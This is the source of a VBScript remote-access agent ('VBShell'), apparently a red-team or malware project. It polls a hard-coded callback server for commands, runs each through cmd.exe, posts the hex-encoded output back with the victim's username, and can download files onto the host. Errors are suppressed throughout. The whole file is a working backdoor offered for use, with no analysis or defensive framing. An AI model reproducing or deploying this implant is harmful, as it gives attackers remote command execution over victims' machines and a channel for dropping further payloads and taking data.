' VBShell - VBScript agent
' Written by Lucas V. Araujo <lucas.vieira.ar@disroot.org>
' More at https://github.com/lvmalware

On Error Resume Next

agent = ""
whoami = ""
CALLBACKURL = "http://192.168.122.1:3000"

Function randbytes(n):
    randomize
    r = ""
    For i = 1 To n
        r = r & Chr(CInt(255 * Rnd()))
    Next
    randbytes = r
End Function

Function str2hex(data):
    encoded = ""
    For i = 1 to Len(data)
        h = Hex(Asc(Mid(data, i, 1)))
        if Len(h) < 2 Then
            h = "0" & h
        End If
        encoded = encoded & h
    Next
    str2hex = encoded
End Function

Function http_get(url)
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.Send
    http_get = http.responseText
End Function

Function http_post(url, data)
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    http.setRequestHeader "Contetn-Length", Len(data)
    http.Send data
    http_get = http.responseText
End Function

Sub echo(msg)
    WScript.Echo msg
End Sub

Function shell_exec(cmd):
    set sh = CreateObject("Wscript.Shell")
    shell_exec = sh.Exec("cmd /c " & chr(34) & cmd & chr(34)).StdOut.ReadAll()
End Function

Function get_command()
    If agent = "" Then
        agent = str2hex(randbytes(4))
        whoami = str2hex(replace(replace(shell_exec("whoami"), Chr(13), ""), Chr(10), ""))
    End If
    get_command = http_get(CALLBACKURL & "/stdin?agent=" & agent & "&whoami=" & whoami)
End Function

Sub send_output(output)
    If agent = "" Then
        agent = str2hex(randbytes(4))
        whoami = str2hex(replace(replace(shell_exec("whoami"), Chr(13), ""), Chr(10), ""))
    End If
    http_post CALLBACKURL & "/stdout", "agent=" & agent & "&whoami=" & whoami & "&output=" & str2hex(output)
End Sub

Function starts(search, keyword)
    starts = (StrComp(Mid(search, 1, Len(keyword)), keyword) = 0)
End Function

Function download(url, path)
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.Send
    If http.Status = 200 Then
        Set strm = CreateObject("Adodb.Stream")
        With strm
            .Type = 1
            .Open
            .Write http.responseBody
            .SaveToFile path, 2
        End With
        download = "File Saved to " & path
    Else
        download = "Failed to download file"
    End If
End Function

Function upload(file)
    Set http = CreateObject("MSXML2.XMLHTTP")
    upload = "Upload was not implemented yet"
End Function

Do While True
    cmd = get_command()
    If StrComp(LCase(cmd), "exit") = 0 Then
        Exit Do
    ElseIf starts(LCase(cmd), "upload ") Then
        args = Split(cmd, " ")
    ElseIf starts(LCase(cmd), "download ") Then
        args = Split(cmd, " ")
        send_output(download(args(1), args(2)))
    ElseIf starts(LCase(cmd), "cd ") Then
        Set sh = CreateObject("Wscript.Shell")
        args = Split(cmd, " ")
        sh.CurrentDirectory = args(1)
    Else
        send_output(shell_exec(cmd))
    End If
Loop
